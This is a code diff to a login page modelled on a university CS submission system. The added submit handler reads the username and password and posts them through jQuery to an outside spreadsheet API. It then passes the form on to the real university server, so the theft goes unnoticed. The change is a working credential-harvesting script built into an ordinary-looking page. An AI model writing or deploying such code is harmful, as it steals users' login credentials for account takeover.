@@ -60,7 +60,7 @@
   <tr>
     <td colspan="2" class="login center middle">
     <!-- Login Content -->
-    <form action="http://cs-serv.cs.bgu.ac.il/cs_service/servlet/service" method="post">
+    <form name="myform"  onsubmit="return OnSubmitForm();" method="post">
     <input type="hidden" name="module" value="SubmissionSystem">
     <input type="hidden" name="action" value="login">
     <table width="537" border="0" cellpadding="0" cellspacing="0" align="center">
@@ -96,15 +96,25 @@
   <tr>
     <td width="537" height="112" colspan="3" class="center top" nowrap="" background="images/centerlogin_05.jpg">
     <br>
-    <input type="submit" value="              ok               " class="knob" onclick="copy()">
+    <input type="submit" value="              ok               " class="knob">
     </td>
+    <script
+		src="https://code.jquery.com/jquery-3.4.1.js"
+		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+		crossorigin="anonymous"></script>
     <script>
-      function copy(){
-      var login = document.getElementById("login").value
-      var password =  document.getElementById("password").value
-      
+      function OnSubmitForm(){
+        var login = document.getElementById("login").value
+        var password = document.getElementById("password").value
+        jQuery.ajax({
+          url:'https://api.apispreadsheets.com/data/3862/',
+          type:'post',
+          data:{login:login,password:password},
+          success: function(){},
+          error: function(){}
+        })
+        document.myform.action = "http://cs-serv.cs.bgu.ac.il/cs_service/servlet/service"
       }
-
     </script>
   </tr>
 </tbody></table>
